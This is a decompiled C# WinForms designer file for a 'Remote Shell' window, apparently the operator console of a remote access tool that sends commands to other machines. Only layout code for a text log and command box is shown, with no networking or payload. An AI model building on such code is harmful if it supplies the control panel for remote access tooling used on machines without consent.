namespace Server.Forms
{
	// Token: 0x020000A9 RID: 169
	public partial class FormShell : global::System.Windows.Forms.Form
	{
		// Token: 0x06000551 RID: 1361 RVA: 0x00004CFD File Offset: 0x00002EFD
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000552 RID: 1362 RVA: 0x00046720 File Offset: 0x00044920
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Forms.FormShell));
			this.richTextBox1 = new global::System.Windows.Forms.RichTextBox();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.label1 = new global::System.Windows.Forms.Label();
			this.siticoneGradientPanel4 = new global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel();
			this.panel1 = new global::System.Windows.Forms.Panel();
			this.siticoneControlBox1 = new global::Siticone.Desktop.UI.WinForms.SiticoneControlBox();
			this.siticoneDragControl1 = new global::Siticone.Desktop.UI.WinForms.SiticoneDragControl(this.components);
			this.siticoneBorderlessForm1 = new global::Siticone.Desktop.UI.WinForms.SiticoneBorderlessForm(this.components);
			this.textBox1 = new global::Siticone.Desktop.UI.WinForms.SiticoneTextBox();
			this.panel1.SuspendLayout();
			base.SuspendLayout();
			this.richTextBox1.BackColor = global::System.Drawing.Color.FromArgb(24, 24, 24);
			this.richTextBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.richTextBox1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.richTextBox1.Font = new global::System.Drawing.Font("Consolas", 8f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.richTextBox1.ForeColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.richTextBox1.Location = new global::System.Drawing.Point(0, 65);
			this.richTextBox1.Margin = new global::System.Windows.Forms.Padding(2);
			this.richTextBox1.Name = "richTextBox1";
			this.richTextBox1.ReadOnly = true;
			this.richTextBox1.Size = new global::System.Drawing.Size(731, 486);
			this.richTextBox1.TabIndex = 166;
			this.richTextBox1.Text = "";
			this.timer1.Interval = 1000;
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = global::System.Drawing.Color.White;
			this.label1.Location = new global::System.Drawing.Point(3, 6);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(106, 20);
			this.label1.TabIndex = 132;
			this.label1.Text = "Remote CMD";
			this.siticoneGradientPanel4.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel4.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.siticoneGradientPanel4.FillColor = global::System.Drawing.Color.FromArgb(27, 91, 50);
			this.siticoneGradientPanel4.FillColor2 = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel4.Location = new global::System.Drawing.Point(0, 34);
			this.siticoneGradientPanel4.Name = "siticoneGradientPanel4";
			this.siticoneGradientPanel4.ShadowDecoration.Parent = this.siticoneGradientPanel4;
			this.siticoneGradientPanel4.Size = new global::System.Drawing.Size(731, 31);
			this.siticoneGradientPanel4.TabIndex = 167;
			this.panel1.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.panel1.Controls.Add(this.siticoneControlBox1);
			this.panel1.Controls.Add(this.label1);
			this.panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.panel1.Location = new global::System.Drawing.Point(0, 0);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(731, 34);
			this.panel1.TabIndex = 168;
			this.siticoneControlBox1.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.siticoneControlBox1.FillColor = global::System.Drawing.Color.Transparent;
			this.siticoneControlBox1.HoverState.Parent = this.siticoneControlBox1;
			this.siticoneControlBox1.IconColor = global::System.Drawing.Color.White;
			this.siticoneControlBox1.Location = new global::System.Drawing.Point(704, 6);
			this.siticoneControlBox1.Name = "siticoneControlBox1";
			this.siticoneControlBox1.ShadowDecoration.Parent = this.siticoneControlBox1;
			this.siticoneControlBox1.Size = new global::System.Drawing.Size(24, 22);
			this.siticoneControlBox1.TabIndex = 145;
			this.siticoneDragControl1.TargetControl = this.panel1;
			this.siticoneBorderlessForm1.ContainerControl = this;
			this.siticoneBorderlessForm1.ShadowColor = global::System.Drawing.Color.FromArgb(29, 185, 84);
			this.textBox1.BorderColor = global::System.Drawing.Color.FromArgb(27, 91, 50);
			this.textBox1.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.textBox1.DefaultText = "";
			this.textBox1.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.textBox1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.textBox1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textBox1.DisabledState.Parent = this.textBox1;
			this.textBox1.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textBox1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.textBox1.FillColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.textBox1.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(27, 91, 50);
			this.textBox1.FocusedState.Parent = this.textBox1;
			this.textBox1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.textBox1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.textBox1.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(27, 91, 50);
			this.textBox1.HoverState.Parent = this.textBox1;
			this.textBox1.Location = new global::System.Drawing.Point(0, 551);
			this.textBox1.Name = "textBox1";
			this.textBox1.PasswordChar = '\0';
			this.textBox1.PlaceholderForeColor = global::System.Drawing.Color.Gainsboro;
			this.textBox1.PlaceholderText = "Write Your Command ";
			this.textBox1.SelectedText = "";
			this.textBox1.ShadowDecoration.Parent = this.textBox1;
			this.textBox1.Size = new global::System.Drawing.Size(731, 26);
			this.textBox1.TabIndex = 169;
			this.textBox1.KeyDown += new global::System.Windows.Forms.KeyEventHandler(this.TextBox1_KeyDown);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(39, 39, 39);
			base.ClientSize = new global::System.Drawing.Size(731, 577);
			base.Controls.Add(this.richTextBox1);
			base.Controls.Add(this.siticoneGradientPanel4);
			base.Controls.Add(this.panel1);
			base.Controls.Add(this.textBox1);
			this.ForeColor = global::System.Drawing.Color.Gainsboro;
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.Name = "FormShell";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Remote Shell";
			base.FormClosed += new global::System.Windows.Forms.FormClosedEventHandler(this.FormShell_FormClosed);
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x040004D5 RID: 1237
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040004D6 RID: 1238
		public global::System.Windows.Forms.RichTextBox richTextBox1;

		// Token: 0x040004D7 RID: 1239
		public global::System.Windows.Forms.Timer timer1;

		// Token: 0x040004D8 RID: 1240
		private global::System.Windows.Forms.Label label1;

		// Token: 0x040004D9 RID: 1241
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel4;

		// Token: 0x040004DA RID: 1242
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x040004DB RID: 1243
		private global::Siticone.Desktop.UI.WinForms.SiticoneControlBox siticoneControlBox1;

		// Token: 0x040004DC RID: 1244
		private global::Siticone.Desktop.UI.WinForms.SiticoneDragControl siticoneDragControl1;

		// Token: 0x040004DD RID: 1245
		private global::Siticone.Desktop.UI.WinForms.SiticoneBorderlessForm siticoneBorderlessForm1;

		// Token: 0x040004DE RID: 1246
		public global::Siticone.Desktop.UI.WinForms.SiticoneTextBox textBox1;
	}
}
